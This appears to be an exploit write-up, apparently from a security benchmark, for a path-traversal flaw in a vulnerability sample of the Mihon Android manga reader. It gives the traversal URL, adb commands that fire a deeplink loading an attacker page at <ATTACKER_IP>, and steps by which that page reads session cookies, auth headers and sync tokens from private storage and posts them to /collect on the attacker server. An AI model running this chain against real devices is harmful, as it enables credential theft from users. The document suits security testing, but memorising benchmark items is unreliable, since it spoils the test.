# 2.4 Insecure Request Interception and Resource Mapping EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 会把外部页面交给 `WebViewActivity` 加载。漏洞样本在 `WebViewScreenContent.shouldInterceptRequest()` 中将 `http://reader-cache.mihon.local/<path>` 映射到应用私有目录 `filesDir/offline_library`。

映射逻辑直接把 URL path 拼接到本地目录，没有校验 `../`、绝对路径或规范化后的目录边界。攻击者控制的页面可以请求：

```text
http://reader-cache.mihon.local/..%2Freader_account/source-session.json
```

该路径会越过 `offline_library`，读取由 `assets/benchmark_mock_data.json` 初始化到应用私有目录的漫画源认证 header、session cookie 和同步 token。

## 运行服务端

```powershell
cd .\exp\mihon-0.19.9\2.4_Insecure_Request_Interception_and_Resource_Mapping
python .\server.py
```

攻击页面路径为：

```text
http://<ATTACKER_IP>:8000/exp/2.4
```

## 触发 deeplink

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.4"
```

如果设备上有多个 Mihon 构建，也可以指定 debug 包：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.4" app.mihon.debug
```

## 预期结果

1. `DeepLinkActivity` 接收 `mihon://help/webview` 并启动 `WebViewActivity`。
2. WebView 加载攻击页面 `http://<ATTACKER_IP>:8000/exp/2.4`。
3. 攻击页面请求 `http://reader-cache.mihon.local/..%2Freader_account/source-session.json`，避免浏览器在请求前折叠 `../`。
4. `shouldInterceptRequest()` 将路径拼接到本地缓存目录并返回文件内容。
5. 攻击页面将读取到的敏感 JSON 回传到 `/collect`，服务端在 `received/collected_*.txt` 中保存结果。
